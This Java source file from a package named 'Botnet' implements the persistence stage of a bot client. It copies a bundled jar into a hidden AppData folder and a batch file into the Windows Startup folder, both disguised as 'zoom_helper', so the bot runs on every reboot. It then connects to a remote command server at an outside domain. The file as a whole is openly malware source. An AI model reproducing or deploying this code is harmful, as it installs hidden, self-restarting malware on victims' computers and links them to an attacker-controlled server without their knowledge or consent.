package Botnet;

import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStream;
import java.nio.file.Files;
import java.nio.file.StandardCopyOption;
import java.util.Date;
/**
 * Diese Klasse sorgt dafür, dass der Bot nach jedem Neustart ausgeführt wird.
 * @author Cedric Busacker
 *
 */
public class Persistance {
/**
 * Diese Methode ruft die Klasse GUI auf, dann wird der Bot in ein verstecktes Verzeichnis kopiert. Außerdem wird dafür gesorgt, dass der Bot nach jedem Neustart ausgeführt wird.
 * Abschließend wird noch ein FirstConnect() zum Server aufgebaut.
 * @param args
 */
	public static void main(String[] args) {
		String username;
		try {
			Host localhost = new Host(true);
			new GUI(localhost);
			username = localhost.getUSER_NAME();
			String Autostart = "C:/Users/"+ username +"/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup";
			String Office = "C:/Users/" + username + "/AppData/Roaming/Microsoft/Windows/Office";
			new File(Office, "zoom_helper.jar").mkdirs();
			InputStream jarStream = Persistance.class.getResourceAsStream("zoom_helper.jar");
			InputStream batStream = Persistance.class.getResourceAsStream("zoom_helper.bat");
			Files.copy(batStream, new File(Autostart, "zoom_helper.bat").toPath(), StandardCopyOption.REPLACE_EXISTING);
			Files.copy(jarStream, new File(Office, "zoom_helper.jar").toPath(), StandardCopyOption.REPLACE_EXISTING);
			Client client = new Client("ceddicedced.online",localhost);
			client.FirstConnect();
		} catch (Exception e) {
			e.printStackTrace();
			LogErros(e);
		}
		
	}
	/**
	 * Alle auftretenden Errors werden in einer LogDatei gespeichert.
	 * @param e
	 */
	private static void LogErros(Exception e) {
		FileWriter LogWriter;
		try {
			e.printStackTrace();
			LogWriter = new FileWriter("C:/Users/Public/errorService.log", true);
			StackTraceElement[] Error = e.getStackTrace();
			LogWriter.write("=== "+ new Date().toString() + " ===\n");
			LogWriter.write(e.toString()+ "\n");
			for (int i = 0; i < Error.length; i++) {
				LogWriter.write(Error[i].toString()+ "\n");
			}
			LogWriter.write("==============\n");
			LogWriter.flush();
			LogWriter.close();
			
		       
		} catch (IOException e1) {
		}
	}

}
